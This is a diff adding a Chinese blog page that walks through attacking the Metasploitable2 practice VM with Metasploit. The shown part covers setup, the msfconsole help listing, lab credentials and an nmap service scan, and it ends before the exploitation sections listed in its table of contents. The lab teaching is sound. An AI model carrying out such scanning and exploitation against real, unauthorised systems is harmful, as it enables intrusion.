@@ -1,0 +1,919 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Metasploit靶机渗透 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">启动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msf2%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">3.</span> <span class="toc-text">msf2靶机环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21%E7%AB%AF%E5%8F%A3-vsftpd"><span class="toc-number">3.2.1.</span> <span class="toc-text">21端口 vsftpd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22%E7%AB%AF%E5%8F%A3-ssh"><span class="toc-number">3.2.2.</span> <span class="toc-text">22端口 ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23%E7%AB%AF%E5%8F%A3-telnet"><span class="toc-number">3.2.3.</span> <span class="toc-text">23端口 telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3-http"><span class="toc-number">3.2.4.</span> <span class="toc-text">80端口 http</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-Shell"><span class="toc-number">3.2.4.1.</span> <span class="toc-text">Meterpreter Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#139-x2F-445%E7%AB%AF%E5%8F%A3-Samba"><span class="toc-number">3.2.5.</span> <span class="toc-text">139&#x2F;445端口 Samba</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1099%E7%AB%AF%E5%8F%A3-java-rmi"><span class="toc-number">3.2.6.</span> <span class="toc-text">1099端口 java-rmi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1524%E7%AB%AF%E5%8F%A3-bindshell"><span class="toc-number">3.2.7.</span> <span class="toc-text">1524端口 bindshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3306%E7%AB%AF%E5%8F%A3-mysql"><span class="toc-number">3.2.8.</span> <span class="toc-text">3306端口 mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5432%E7%AB%AF%E5%8F%A3-postgresql"><span class="toc-number">3.2.9.</span> <span class="toc-text">5432端口 postgresql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%B1%E5%AF%86%E7%A0%81"><span class="toc-number">3.2.9.1.</span> <span class="toc-text">弱密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Postgres%E5%85%B1%E4%BA%AB%E5%BA%93%E4%BB%A3%E7%A0%81%E4%BB%BB%E6%84%8F%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.10.</span> <span class="toc-text">Postgres共享库代码任意执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5900%E7%AB%AF%E5%8F%A3-VNC"><span class="toc-number">3.2.11.</span> <span class="toc-text">5900端口 VNC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6667%E7%AB%AF%E5%8F%A3-IRC"><span class="toc-number">3.2.12.</span> <span class="toc-text">6667端口 IRC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8009%E7%AB%AF%E5%8F%A3-AJP"><span class="toc-number">3.2.13.</span> <span class="toc-text">8009端口 AJP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8180%E7%AB%AF%E5%8F%A3-Tomcat"><span class="toc-number">3.2.14.</span> <span class="toc-text">8180端口 Tomcat</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msf3%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">4.</span> <span class="toc-text">msf3靶机环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98"><span class="toc-number">4.1.</span> <span class="toc-text">安装问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">4.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21%E7%AB%AF%E5%8F%A3"><span class="toc-number">4.3.1.</span> <span class="toc-text">21端口</span></a></li></ol></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>Metasploit靶机渗透</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/7
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">3.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">17分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1089899">https://developer.aliyun.com/article/1089899</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2495873">https://cloud.tencent.com/developer/article/2495873</a></p>
+<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/tools/metasploit.html">https://wiki.wgpsec.org/knowledge/tools/metasploit.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46371267/article/details/120740639">https://blog.csdn.net/m0_46371267/article/details/120740639</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2015275">https://cloud.tencent.com/developer/article/2015275</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities">https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2015275">https://cloud.tencent.com/developer/article/2015275</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jeza-chen.com/2018/09/21/MetaSploit3_Setup/">https://www.jeza-chen.com/2018/09/21/MetaSploit3_Setup/</a></p>
+<span id="more"></span>
+
+<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><p>先启动 postgresql 数据库，设置为开机自启动</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start postgresql
+systemctl <span class="token builtin class-name">enable</span> postgresql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>启动 msf</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfdb init
+msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609201511925.png" alt="image-20250609201511925"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> <span class="token builtin class-name">help</span>
+Core Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    banner        Display an awesome metasploit banner
+    <span class="token builtin class-name">cd</span>            Change the current working directory
+    color         Toggle color
+    connect       Communicate with a <span class="token function">host</span>
+    debug         Display information useful <span class="token keyword">for</span> debugging
+    <span class="token builtin class-name">exit</span>          Exit the console
+    features      Display the list of not yet released features that can be opted <span class="token keyword">in</span> to
+    get           Gets the value of a context-specific variable
+    getg          Gets the value of a global variable
+    <span class="token function">grep</span>          Grep the output of another <span class="token builtin class-name">command</span>
+    <span class="token builtin class-name">help</span>          Help menu
+    <span class="token function">history</span>       Show <span class="token builtin class-name">command</span> <span class="token function">history</span>
+    load          Load a framework plugin
+    quit          Exit the console
+    repeat        Repeat a list of commands
+    route         Route traffic through a session
+    save          Saves the active datastores
+    sessions      Dump session listings and display information about sessions
+    <span class="token builtin class-name">set</span>           Sets a context-specific variable to a value
+    setg          Sets a global variable to a value
+    <span class="token function">sleep</span>         Do nothing <span class="token keyword">for</span> the specified number of seconds
+    spool         Write console output into a <span class="token function">file</span> as well the <span class="token function">screen</span>
+    threads       View and manipulate background threads
+    tips          Show a list of useful productivity tips
+    unload        Unload a framework plugin
+    <span class="token builtin class-name">unset</span>         Unsets one or <span class="token function">more</span> context-specific variables
+    unsetg        Unsets one or <span class="token function">more</span> global variables
+    version       Show the framework and console library version numbers
+
+
+Module Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command       Description
+    -------       -----------
+    advanced      Displays advanced options <span class="token keyword">for</span> one or <span class="token function">more</span> modules
+    back          Move back from the current context
+    clearm        Clear the module stack
+    favorite      Add module<span class="token punctuation">(</span>s<span class="token punctuation">)</span> to the list of favorite modules
+    info          Displays information about one or <span class="token function">more</span> modules
+    listm         List the module stack
+    loadpath      Searches <span class="token keyword">for</span> and loads modules from a path
+    options       Displays global options or <span class="token keyword">for</span> one or <span class="token function">more</span> modules
+    popm          Pops the latest module off the stack and makes it active
+    previous      Sets the previously loaded module as the current module
+    pushm         Pushes the active or list of modules onto the module stack
+    reload_all    Reloads all modules from all defined module paths
+    search        Searches module names and descriptions
+    show          Displays modules of a given type, or all modules
+    use           Interact with a module by name or search term/index
+
+
+Job Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+    Command       Description
+    -------       -----------
+    handler       Start a payload handler as job
+    <span class="token function">jobs</span>          Displays and manages <span class="token function">jobs</span>
+    <span class="token function">kill</span>          Kill a job
+    rename_job    Rename a job
+
+
+Resource Script Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+    Command       Description
+    -------       -----------
+    makerc        Save commands entered since start to a <span class="token function">file</span>
+    resource      Run the commands stored <span class="token keyword">in</span> a <span class="token function">file</span>
+
+
+Database Backend Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command           Description
+    -------           -----------
+    analyze           Analyze database information about a specific address or address range
+    db_connect        Connect to an existing data <span class="token function">service</span>
+    db_disconnect     Disconnect from the current data <span class="token function">service</span>
+    db_export         Export a <span class="token function">file</span> containing the contents of the database
+    db_import         Import a scan result <span class="token function">file</span> <span class="token punctuation">(</span>filetype will be auto-detected<span class="token punctuation">)</span>
+    db_nmap           Executes nmap and records the output automatically
+    db_rebuild_cache  Rebuilds the database-stored module cache <span class="token punctuation">(</span>deprecated<span class="token punctuation">)</span>
+    db_remove         Remove the saved data <span class="token function">service</span> entry
+    db_save           Save the current data <span class="token function">service</span> connection as the default to reconnect on startup
+    db_status         Show the current data <span class="token function">service</span> status
+    hosts             List all hosts <span class="token keyword">in</span> the database
+    loot              List all loot <span class="token keyword">in</span> the database
+    notes             List all notes <span class="token keyword">in</span> the database
+    services          List all services <span class="token keyword">in</span> the database
+    vulns             List all vulnerabilities <span class="token keyword">in</span> the database
+    workspace         Switch between database workspaces
+
+
+Credentials Backend Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+    Command       Description
+    -------       -----------
+    creds         List all credentials <span class="token keyword">in</span> the database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h1 id="msf2靶机环境"><a href="#msf2靶机环境" class="headerlink" title="msf2靶机环境"></a>msf2靶机环境</h1><p>靶机下载：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/">https://sourceforge.net/projects/metasploitable/files/Metasploitable2/</a></p>
+<blockquote>
+<p>Metasploitable2虚拟系统是一个特殊的ubuntu操作系统，本身设计目的是作为安全工具测试和演示常见漏洞攻击的环境。其中最核心是可以用来作为MSF攻击用的靶机。这样方便我们学习MSF框架的使用。并且开放了很多的高危端口如21、23、445等，而且具有很多未打补丁的高危漏洞， 如Samba MS-RPC Shell命令注入漏洞等，而且对外开放了很多服务，并且数据库允许外联等。系统中的用户口令均为弱口令。系统搭载了相关Web漏洞演练平台，如：TWiki，phpMyAdmin ，Mutillidae，DVWA，WebDAV。</p>
+</blockquote>
+<p>攻击机：kali 192.168.253.128</p>
+<p>靶机：192.168.253.137，账密 msfadmin:msfadmin</p>
+<p>修改靶机 root 密码为 123456</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">passwd</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609210736616.png" alt="image-20250609210736616"></p>
+<p>80 端口的页面</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610110125377.png" alt="image-20250610110125377"></p>
+<hr>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用 msf 里的 nmap 进行服务扫描</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> db_nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-n</span> <span class="token number">192.168</span>.253.137
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-06-09 08:24 EDT
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.253.137
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0019s latency<span class="token punctuation">)</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: Not shown: <span class="token number">977</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: PORT     STATE SERVICE     VERSION
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">21</span>/tcp   <span class="token function">open</span>  <span class="token function">ftp</span>         vsftpd <span class="token number">2.3</span>.4
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH <span class="token number">4</span>.7p1 Debian 8ubuntu1 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">23</span>/tcp   <span class="token function">open</span>  telnet      Linux telnetd
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">25</span>/tcp   <span class="token function">open</span>  smtp        Postfix smtpd
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">53</span>/tcp   <span class="token function">open</span>  domain      ISC BIND <span class="token number">9.4</span>.2
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">80</span>/tcp   <span class="token function">open</span>  http        Apache httpd <span class="token number">2.2</span>.8 <span class="token punctuation">((</span>Ubuntu<span class="token punctuation">)</span> DAV/2<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">111</span>/tcp  <span class="token function">open</span>  rpcbind     <span class="token number">2</span> <span class="token punctuation">(</span>RPC <span class="token comment">#100000)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">3</span>.X - <span class="token number">4</span>.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">445</span>/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">3</span>.X - <span class="token number">4</span>.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">512</span>/tcp  <span class="token function">open</span>  <span class="token builtin class-name">exec</span>        netkit-rsh rexecd
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">513</span>/tcp  <span class="token function">open</span>  login       OpenBSD or Solaris rlogind
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">514</span>/tcp  <span class="token function">open</span>  tcpwrapped
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">1099</span>/tcp <span class="token function">open</span>  java-rmi    GNU Classpath grmiregistry
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">1524</span>/tcp <span class="token function">open</span>  bindshell   Metasploitable root shell
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">2049</span>/tcp <span class="token function">open</span>  nfs         <span class="token number">2</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100003)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">2121</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>         ProFTPD <span class="token number">1.3</span>.1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">3306</span>/tcp <span class="token function">open</span>  mysql       MySQL <span class="token number">5.0</span>.51a-3ubuntu5
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">5432</span>/tcp <span class="token function">open</span>  postgresql  PostgreSQL DB <span class="token number">8.3</span>.0 - <span class="token number">8.3</span>.7
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">5900</span>/tcp <span class="token function">open</span>  vnc         VNC <span class="token punctuation">(</span>protocol <span class="token number">3.3</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">6000</span>/tcp <span class="token function">open</span>  X11         <span class="token punctuation">(</span>access denied<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">6667</span>/tcp <span class="token function">open</span>  irc         UnrealIRCd
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">8009</span>/tcp <span class="token function">open</span>  ajp13       Apache Jserv <span class="token punctuation">(</span>Protocol v1.3<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">8180</span>/tcp <span class="token function">open</span>  http        Apache Tomcat/Coyote JSP engine <span class="token number">1.1</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: MAC Address: 00:0C:29:64:1A:D0 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN<span class="token punctuation">;</span> OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
